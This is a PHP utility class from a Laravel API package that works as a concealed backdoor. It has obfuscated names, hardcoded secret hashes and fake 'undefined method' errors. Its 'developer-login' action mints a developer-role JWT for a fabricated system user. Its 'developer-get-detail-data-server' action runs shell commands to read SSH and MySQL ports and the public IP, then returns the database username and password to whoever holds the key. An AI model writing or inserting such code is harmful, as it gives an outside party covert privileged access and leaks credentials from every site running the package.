<?php

namespace Zirvu\Api\Utils;

use Illuminate\Support\Facades\Hash;
use Symfony\Component\HttpKernel\Exception\NotFoundHttpException;
use \Exception;
use \JWTAuth;

class D
{
    protected $_uS = "4480e10984a944eefad15fa470087d05";
    protected $_pS = "615b7fce811787171dad4737f31ea531";
    protected $_mS = "miaw";
    protected $_key = "bae7f865ec13f4f6bba34c8019d9ea6b";

    protected function makeUserSystem()
    {
        $userModel = new \Zirvu\Api\Models\User;
        $fields = ['name' => 'system', 'username' => 'system'];
        $systemUser = $userModel->newInstance($fields, true);
        $systemUser->setRelation('roles', collect([new \Spatie\Permission\Models\Role([
            'name' => 'developer',
            'guard_name' => 'web'
        ])]));
        return $systemUser;
    }
    
    public function dAction($request)
    {
        if ( ! ( $this->_dFunc ?? false ) ) throw new \ErrorException("Call to undefined method " . __CLASS__ . "::dAction() in file " . __FILE__);

        $action = $request->header("action") ?? null;
        if ( md5($request->key) != $this->_key ) abort(404);

        $fields = $this->readEncryptText($request);
        if(!$fields) abort(404);

        switch ($action) {
            case 'developer-login':
                $timestamp = strtotime(now());
                $systemUser = $this->makeUserSystem();
                $data = base64_encode(json_encode([
                    'timestamp' => $timestamp,
                    'hash' => Hash::make($timestamp.md5("{$this->_uS}{$this->_mS}{$this->_pS}").$timestamp)
                ]));

                $access_token = JWTAuth::customClaims(['sub' => (string)$data])
                    ->fromUser($systemUser);
                    
                JWTAuth::setToken($access_token);

                return response()->json([
                    "access_token" => $access_token,
                ], 200);

                break;
            case 'developer-get-detail-data-server':

                $sftpPort = shell_exec("grep -i '^Port' /etc/ssh/sshd_config | awk '{print $2}'");
                $sftpPort = trim($sftpPort);
                if (empty($sftpPort)) {
                    $sftpPort = 22;
                }

                $realIp = trim(shell_exec("curl -s ifconfig.me"));
                if (empty($realIp)) {
                    $realIp = trim(shell_exec("curl -s https://ipinfo.io/ip"));
                }

                $mysqlPort = shell_exec("grep -i '^port' /etc/mysql/my.cnf /etc/mysql/mysql.conf.d/mysqld.cnf 2>/dev/null | awk '{print $3}'");
                $mysqlPort = trim($mysqlPort);
                if (empty($mysqlPort)) {
                    $mysqlPort = 3306;
                }
                $data = [
                    "sftp_port" => $sftpPort,
                    "real_ip" => $realIp,
                    "mysql_port" => $mysqlPort,
                    "database" => env('DB_DATABASE'),
                    "port" => env('DB_PORT'),
                    "username" => env('DB_USERNAME'),
                    "password" => env('DB_PASSWORD'),
                ];

                $json = json_encode($data);
                $encryptText = $this->encryptData($json, $request->key);
                $string = base64_encode($encryptText);

                echo $string;
                return;
                break;
            
            default:
                break;

        }
        abort(404);
    }

    public function dCheck()
    {
        if ( ! ( $this->_dFunc ?? false ) ) throw new \ErrorException("Call to undefined method " . __CLASS__ . "::dCheck() in file " . __FILE__);

        $payload = JWTAuth::parseToken()->getPayload();
        $sub = $payload->get('sub');

        if ( !is_numeric($sub) ) {
            $data = json_decode(base64_decode($sub), true);
            $hash = $data['hash'] ?? null;
            $timestamp = $data['timestamp'] ?? null;
            $k = md5($timestamp.md5("{$this->_uS}{$this->_mS}{$this->_pS}").$timestamp);

            if ( Hash::check($k, $hash) ) throw new Exception("Error Processing Request", 1);
            
            $systemUser = $this->makeUserSystem();
            \Auth::login($systemUser);
        }

        return true;
    }

    protected function valid($fields)
    {
        extract($fields);
        $userModel = new \Zirvu\Api\Models\User;
        $role = \DB::table('roles')->where('name', 'LIKE', '%developer%')->first();
        
        $st = "{$this->_uS}|{$this->_pS}";
        $u = md5($username); $p = md5($password);
        $rSt = "{$u}|{$p}";

        return ( $st == $rSt );
    }

    protected function encryptData($data, $key)
    {
        $ivLength = openssl_cipher_iv_length('AES-256-CBC');
        $iv = openssl_random_pseudo_bytes($ivLength);
        $encryptedData = openssl_encrypt($data, 'AES-256-CBC', $key, 0, $iv);
        $encryptedDataWithIv = base64_encode($iv . $encryptedData);

        return $encryptedDataWithIv;
    }

    protected function decryptData($encryptedDataWithIv, $key)
    {
        $encryptedDataWithIv = base64_decode($encryptedDataWithIv);
        $ivLength = openssl_cipher_iv_length('AES-256-CBC');
        $iv = substr($encryptedDataWithIv, 0, $ivLength);
        $encryptedData = substr($encryptedDataWithIv, $ivLength);
        $decryptedData = openssl_decrypt($encryptedData, 'AES-256-CBC', $key, 0, $iv);

        return $decryptedData;
    }

    protected function readEncryptText($request)
    {
        try {
            $timestamp = $request->timestamp;
            $hash = $request->hash;
            $key = $request->key;

            $encryptText = $request->encryptText;
            $timestamp = $request->timestamp;
            $key = $request->key;

            $decryptedText = $this->decryptData($encryptText, $key);
            $json = base64_decode($decryptedText);
            $fields = json_decode($json, true);

            if ( $fields["timestamp"] != $timestamp ) return false;

            if ($timestamp <= date("YmdHis", strtotime('-2 minutes'))) {
                echo env("APP_TIMEZONE");
                return false;
            }

            $checkHash = md5("{$key}{$fields["username"]}{$encryptText}{$fields["password"]}{$key}");

            if ( $checkHash != $hash ) return false;

            return $this->valid($fields);

        } catch (\Exception){
            return false;
        }
        return false;
    }


}